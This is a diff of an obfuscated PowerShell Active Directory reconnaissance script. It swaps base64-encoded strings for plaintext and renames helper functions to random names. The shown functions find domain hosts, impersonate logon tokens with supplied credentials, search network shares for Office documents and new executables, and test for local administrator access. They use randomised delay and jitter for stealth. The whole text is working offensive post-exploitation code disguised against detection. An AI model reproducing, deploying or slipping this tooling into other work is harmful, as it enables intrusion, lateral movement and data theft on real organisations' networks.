-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFF1ZXJ5aW5nIGNvbXB1dGVycyBpbiB0aGUgZG9tYWlu")))
-            $TargetComputers = aglnim @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
+            $TargetComputers = auxvef @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6IHswfQ=="))) -f $($TargetComputers.Length))
+        Write-Verbose ("[Find-InterestingDomainShareFile] TargetComputers length: {0}" -f $($TargetComputers.Length))
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIE5vIGhvc3RzIGZvdW5kIHRvIGVudW1lcmF0ZQ==")))
+            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
         }
 
         
@@ -11421,13 +11425,13 @@ function qhoimi {
 
             if ($TokenHandle) {
                 
-                $Null = jgnbzn -TokenHandle $TokenHandle -Quiet
+                $Null = kckfvi -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
 
                 $SearchShares = @()
-                if ($TargetComputer.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
+                if ($TargetComputer.StartsWith('\\')) {
                     
                     $SearchShares += $TargetComputer
                 }
@@ -11435,10 +11439,10 @@ function qhoimi {
                     $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                     if ($Up) {
                         
-                        $Shares = dmgpvz -ComputerName $TargetComputer
+                        $Shares = otbyom -ComputerName $TargetComputer
                         ForEach ($Share in $Shares) {
                             $ShareName = $Share.Name
-                            $Path = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))+$TargetComputer+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))+$ShareName
+                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                             
                             if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                 
@@ -11449,7 +11453,7 @@ function qhoimi {
                                         $SearchShares += $Path
                                     }
                                     catch {
-                                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WyFdIE5vIGFjY2VzcyB0byAkUGF0aA==")))
+                                        Write-Verbose "[!] No access to $Path"
                                     }
                                 }
                             }
@@ -11458,55 +11462,55 @@ function qhoimi {
                 }
 
                 ForEach ($Share in $SearchShares) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoaW5nIHNoYXJlOiAkU2hhcmU=")))
+                    Write-Verbose "Searching share: $Share"
                     $SearchArgs = @{
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) = $Share
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ=="))) = $Include
+                        'Path' = $Share
+                        'Include' = $Include
                     }
                     if ($OfficeDocs) {
-                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw==")))] = $OfficeDocs
+                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                     }
                     if ($FreshEXEs) {
-                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz")))] = $FreshEXEs
+                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                     }
                     if ($LastAccessTime) {
-                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdEFjY2Vzc1RpbWU=")))] = $LastAccessTime
+                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                     }
                     if ($LastWriteTime) {
-                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdFdyaXRlVGltZQ==")))] = $LastWriteTime
+                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                     }
                     if ($CreationTime) {
-                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRpb25UaW1l")))] = $CreationTime
+                        $SearchArgs['CreationTime'] = $CreationTime
                     }
                     if ($CheckWriteAccess) {
-                        $SearchArgs[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw==")))] = $CheckWriteAccess
+                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                     }
-                    feyvym @SearchArgs
+                    gjmfdn @SearchArgs
                 }
             }
 
             if ($TokenHandle) {
-                husafk
+                njmybn
             }
         }
 
         $LogonToken = $Null
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
-                $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+                $LogonToken = kckfvi -Credential $Credential
             }
             else {
-                $LogonToken = jgnbzn -Credential $Credential -Quiet
+                $LogonToken = kckfvi -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFRvdGFsIG51bWJlciBvZiBob3N0czogezB9"))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIERlbGF5OiAkRGVsYXksIEppdHRlcjogJEppdHRlcg==")))
+            Write-Verbose ("[Find-InterestingDomainShareFile] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -11516,38 +11520,38 @@ function qhoimi {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mIHswfSk="))) -f $($TargetComputers.count))
+                Write-Verbose ("[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of {0})" -f $($TargetComputers.count))
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRz")))
+            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5jbHVkZQ=="))) = $Include
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZWRTaGFyZXM="))) = $ExcludedShares
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2ZmaWNlRG9jcw=="))) = $OfficeDocs
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhjbHVkZUhpZGRlbg=="))) = $ExcludeHidden
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnJlc2hFWEVz"))) = $FreshEXEs
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hlY2tXcml0ZUFjY2Vzcw=="))) = $CheckWriteAccess
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
+                'Include' = $Include
+                'ExcludedShares' = $ExcludedShares
+                'OfficeDocs' = $OfficeDocs
+                'ExcludeHidden' = $ExcludeHidden
+                'FreshEXEs' = $FreshEXEs
+                'CheckWriteAccess' = $CheckWriteAccess
+                'TokenHandle' = $LogonToken
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function jpiynf {
+function wjmict {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -11595,7 +11599,7 @@ function jpiynf {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -11627,32 +11631,32 @@ function jpiynf {
 
     BEGIN {
         $ComputerSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
+            'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))]) {
+        if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gUXVlcnlpbmcgY29tcHV0ZXJzIGluIHRoZSBkb21haW4=")))
-            $TargetComputers = aglnim @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
+            $TargetComputers = auxvef @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVGFyZ2V0Q29tcHV0ZXJzIGxlbmd0aDogezB9"))) -f $($TargetComputers.Length))
+        Write-Verbose ("[Find-LocalAdminAccess] TargetComputers length: {0}" -f $($TargetComputers.Length))
         if ($TargetComputers.Length -eq 0) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRl")))
+            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
         }
 
         
@@ -11661,14 +11665,14 @@ function jpiynf {
 
             if ($TokenHandle) {
                 
-                $Null = jgnbzn -TokenHandle $TokenHandle -Quiet
+                $Null = kckfvi -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
                     
-                    $Access = gsoflb -ComputerName $TargetComputer
+                    $Access = asbepi -ComputerName $TargetComputer
                     if ($Access.IsAdmin) {
                         $TargetComputer
                     }
@@ -11676,27 +11680,27 @@ function jpiynf {
             }
 
             if ($TokenHandle) {
-                husafk
+                njmybn
             }
         }
 
         $LogonToken = $Null
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
-                $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+                $LogonToken = kckfvi -Credential $Credential
             }
             else {
-                $LogonToken = jgnbzn -Credential $Credential -Quiet
+                $LogonToken = kckfvi -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsYXk=")))] -or $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcE9uU3VjY2Vzcw==")))]) {
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiB7MH0="))) -f $($TargetComputers.count))
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVy")))
+            Write-Verbose ("[Find-LocalAdminAccess] Total number of hosts: {0}" -f $($TargetComputers.count))
+            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
@@ -11706,26 +11710,26 @@ function jpiynf {
                 
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgezB9KQ=="))) -f $($TargetComputers.count))
+                Write-Verbose ("[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of {0})" -f $($TargetComputers.count))
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
             }
         }
         else {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHM=")))
+            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"
 
             
             $ScriptParams = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9rZW5IYW5kbGU="))) = $LogonToken
+                'TokenHandle' = $LogonToken
             }
 
             
-            payhcg -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            umwnhz -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
 
 
-function cpbrhd {
+function oxfphz {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -11767,12 +11771,12 @@ function cpbrhd {
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $GroupName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5pc3RyYXRvcnM="))),
+        $GroupName = 'Administrators',
 
         [ValidateSet('API', 'WinNT')]
         [Alias('CollectionMethod')]
         [String]
-        $Method = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QVBJ"))),
+        $Method = 'API',
 
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
@@ -11781,7 +11785,7 @@ function cpbrhd {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -11813,32 +11817,32 @@ function cpbrhd {
 
     BEGIN {
         $ComputerSearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))
+            'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJEb21haW4=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ComputerDomain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJMREFQRmlsdGVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $ComputerLDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZWFyY2hCYXNl")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $ComputerSearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))] = $Unconstrained }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))] = $OperatingSystem }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTZXJ2aWNlUGFjaw==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))] = $ServicePack }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJTaXRlTmFtZQ==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))] = $SiteName }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ComputerSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
